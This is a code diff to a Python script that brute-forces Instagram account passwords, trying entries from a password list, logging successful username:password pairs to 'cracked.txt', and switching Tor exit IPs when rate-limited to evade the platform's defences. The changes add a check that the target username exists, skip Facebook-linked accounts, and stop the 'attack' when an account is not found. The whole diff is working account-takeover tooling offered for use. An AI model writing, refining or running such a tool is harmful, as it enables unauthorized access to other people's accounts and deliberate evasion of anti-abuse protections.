@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import os, sys, time
+import os, sys, time, subprocess
 from instagrapi import Client
 from stem.control import Controller
 
@@ -25,7 +25,19 @@ def save_log(username, password):
     with open('cracked.txt', 'a') as f:
         f.write(f"{username}:{password}\n")
 
+def username_exists(username):
+    result = subprocess.run(
+        ["instaloader", "--no-download", "--quiet", username],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL
+    )
+    return result.returncode == 0
+
 def login_with_passwords(username, password_list):
+    if not username_exists(username):
+        print(f"[✘] User '{username}' does not exist on Instagram. Aborting attack.")
+        return False
+
     delay = DELAY_BASE
     failures = 0
     for pwd in password_list:
@@ -39,10 +51,16 @@ def login_with_passwords(username, password_list):
             return True
         except Exception as e:
             errmsg = str(e).lower()
-            if 'rate' in errmsg or '429' in errmsg:
+            if 'facebook' in errmsg:
+                print("[!] Account is linked to Facebook login. Skipping this user.")
+                return False
+            elif 'rate' in errmsg or '429' in errmsg:
                 print("[!] Rate limited. Changing IP...")
                 change_ip()
                 failures = 0
+            elif "can't find an account" in errmsg:
+                print("[✘] User not found. Aborting attack.")
+                return False
             else:
                 print(f"[!] Failed: {e}")
                 failures += 1
